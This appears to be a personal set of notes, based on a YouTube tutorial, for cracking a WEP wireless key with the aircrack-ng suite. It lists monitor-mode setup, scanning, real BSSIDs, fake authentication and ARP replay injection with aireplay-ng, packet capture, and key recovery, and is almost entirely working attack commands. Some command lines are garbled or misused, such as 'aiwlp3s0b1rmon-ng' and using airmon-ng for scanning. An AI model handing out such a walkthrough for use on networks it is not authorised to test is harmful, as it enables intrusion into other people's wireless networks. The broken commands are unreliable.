This attack aimed at cracking the key

Following the tutorial, wireless exposed and the internet :
https://www.youtube.com/watch?v=jETwvEDaJeQ

== Configure the interfaces manually (iw) ==

Doing in with my router.

Check the interface with the command:
    ifconfig -a

Reset all and put down the interface with airmon:
    sudo ifconfig wlp3s0b1 down

The output of ifconfig will not list wlp3s0b1.

Bring the interface up:
    sudo ifconfig wlp3s0b1 up

Perform an active scan:
    sudo iw dev wlp3s0b1 scan

This output of the above command is huge. It scans all the wireless network
around, for example:

    * [[mynumericable]]

list all the interface:
    sudo ip link

create a monitor mode interface:
    sudo iw dev wlp3s0b1 interface add moni0 type monitor

Manually set the channel because my network is running there and I want to fix
the problem I have not been able to capture data packets:
    sudo iw dev wlp3s0b1 set channel 11

Other options to listen and inject:

    sudo aiwlp3s0b1rmon-ng check wlp3s0b1
    sudo airmon-ng stop wlp3s0b1

    To start the network card in monitor mode:
    sudo airmon-ng start wlp3s0b1

Check that is running in Monitor mode:
    iwconfig

    sudo airodump-ng wlp3s0b1

== Using aircrack suite ==

Scan the network to find a target:
    sudo airmon-ng moni0

Should I wish to crack NUMERICABLE-CD61 or mvm, I would need to write down:

| BSSID             | CH | ESSID              |
|-------------------|----|--------------------|
| F4:06:8D:71:7F:3A | 11 | NUMERICABLE-CD61   |
| 00:19:70:6E:56:DA | 1  | mvm search belgium |>

Note that the CH is the channel and it is the frequency of the wave.  More
information in https://en.wikipedia.org/wiki/List_of_WLAN_channels

== There is a problem ==
Despite all my efforts the #Data does not increase, it stays at 0.
I have changed my cards for an external one and it works.

Another test tell me that I have a configuration problem.


Take the following action during the same period:

1) The following line will link my wifi to that particular connection:

sudo airodump-ng -w wep -c 11 --bssid F4:06:8D:71:7F:3A wlp3s0b1

2) Let the above command run for sometime and in the meantime run the following:

sudo aireplay-ng -1 0 -a F4:06:8D:71:7F:3A wlp3s0b1

This command will associate my wifi with the connection so that I could
transmit data.

In another consol, type the following:

3) sudo aireplay-ng -3 -b F4:06:8D:71:7F:3A wlp3s0b1

This command will start sending/receiving data on the new link.

Now you could check action 1 and see that we are sending and receiving data.

We should wait that the amount of data hit 30,000. This will take an hour or so.
Once this is done, take 3 and interrupt with ctrl-c.

Now we check the directory to find a file .cap the key is inside.

Then type:
sudo aircrack-ng <file.cap>
